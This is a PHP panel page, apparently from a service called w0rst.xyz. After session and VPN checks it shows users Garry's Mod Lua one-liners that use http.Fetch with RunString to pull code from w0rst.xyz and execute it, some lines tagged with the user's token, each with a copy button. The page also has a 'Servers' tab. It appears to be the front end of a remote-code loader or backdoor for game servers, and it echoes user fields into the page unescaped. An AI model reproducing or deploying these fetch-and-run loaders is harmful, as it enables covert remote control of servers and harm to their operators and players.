<?php

require_once($_SERVER['DOCUMENT_ROOT']."/core/config.php");

$LocalInfo = $Local::Info();
$username = $LocalInfo['username'];
$discord = $LocalInfo['discord'];
$avatar = $LocalInfo['avatar'];
$token = $LocalInfo['token'];
$uid = $LocalInfo['uid'];

if(!$Local::IsActive()) { $Local::Redirect("invalid session"); }

// if not verified & active was having issues with it redirecting for this while its not an issue
if(!$Local::IsVerified() && $Local::IsActive()) { $Local::Redirect("awaiting email activation"); }

if($Local::IsBlacklisted()) { $Local::Redirect("blacklisted"); }

$Local::UpdateIp(); // updates ip if it has changed at all

// check if the user isn't using vpn or proxy
if($Secure::AntiVpn() || $Secure::AntiProxy()) {
    $Local::Redirect("vpn/proxy detected");
}

// if discords null & localinfo exists
// just a dumb error ez fix ;0 ;0 ;0
if($discord == "NULL" && !empty($LocalInfo)) {
    header("Location: https://w0rst.xyz/panel/req/discord.php?action=login");
}

$script = "http.Fetch('https://w0rst.xyz/project/func/load.lua', RunString)";
$public = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=public&token=$token', RunString)";
$private = "http.Fetch('https://w0rst.xyz/project/func/napalm.php?type=private&token=$token', RunString)";

?>

<script src="js/custom.js"></script>
<script src="js/snowstorm.js"></script>
<div class="nav-container"> 
    <div class="navbar">
        <div class="nav-tab" id="tabs">
            <button class="nav-button" onclick="link('dashboard')" id="1">Home</button>
            <button class="nav-button" onclick="link('members')" id="2">Members</button>
            <button class="nav-button" onclick="link('servers')" id="3">Servers</button>
            <?php if($Local::IsAdmin()) { echo("<button class='nav-button' onclick='link(`logs`)' id='4'>Logging</button>"); } ?>
        </div>
        <div class="dropdown-holder">
            <div class="button-drop">
                <?php echo("<img class='circle pfp' src='$avatar' onerror=this.src='img/pic.png'>"); ?>
                <?php echo("<span class='name'>$username</span>"); ?>
            </div>
            <div class="dropdown">
                <a class="dropdown-item" onclick="link('account')">Account</a>
                <a class="dropdown-item" onclick="script()">Script</a>
                <a class="dropdown-item" onclick="link('req/simple.php?request=logout')"">Logout</a>
            </div>
        </div>
    </div>
</div><br><br><br>
<div class="hidden1">
    <div class="c-card">
        <h1 class="card-header">Script Information</h1>
        <div class="form-row">
            <label class="label">Public</label>
            <input class="input" id="public" value="<?php echo($public); ?>">
            <label class="label">Private</label>
            <input class="input" id="private" value="<?php echo($private); ?>">
            <label class="label">Script</label>
            <input class="input" id="script" value="<?php echo($script); ?>" style='margin-bottom:10px;'>
            <div class="button-container" style="padding-bottom:0;">
                <button onclick="copy(1)" class="button material-ripple hover" style="width:85%;">Copy Public</button>
                <button onclick="copy(2)" class="button material-ripple hover" style="width:85%;">Copy Private</button>
                <button onclick="copy(3)" class="button material-ripple hover" style="width:85%;">Copy Script</button>
            </div>
        </div>
    </div>
</div>
<script>
    $(".dropdown-holder").mouseenter(function() {
        $('.button-drop').css("border-radius", "3px 3px 0px 0px");
        $(".dropdown").fadeIn(150); 
    });

    $(".dropdown-holder").mouseleave(function() {
        $('.button-drop').css("border-radius", "3px");
        $(".dropdown").fadeOut(150); 
    });

    if($(".webpage")) {
        switch($(".webpage").attr('id')) {
            case "home": $('#1').css("opacity", "85%"); break;
            case "members": $('#2').css("opacity", "85%"); break;
            case "servers": $('#3').css("opacity", "85%"); break;
            case "logging": $('#4').css("opacity", "85%"); break;
        }
    }
    
    function script() { 
        $(".hidden1").fadeToggle(250); 
        $('body').css("overflow-y", "hidden"); 
    }

    function copy(type) {
        if(type == 1) { $("#public").select(); document.execCommand("copy"); }
        if(type == 2) { $("#private").select(); document.execCommand("copy"); }
        if(type == 3) { $("#script").select(); document.execCommand("copy"); }
    }

    $(document).mouseup(function(e) { 
        if(!$(".c-card").is(e.target) && $(".c-card").has(e.target).length === 0 &&  $(".hidden1").css('display') != 'none') {  
            $('body').css("overflow-y", "auto");
            $(".hidden1").fadeOut(450); 
        }
    })
</script>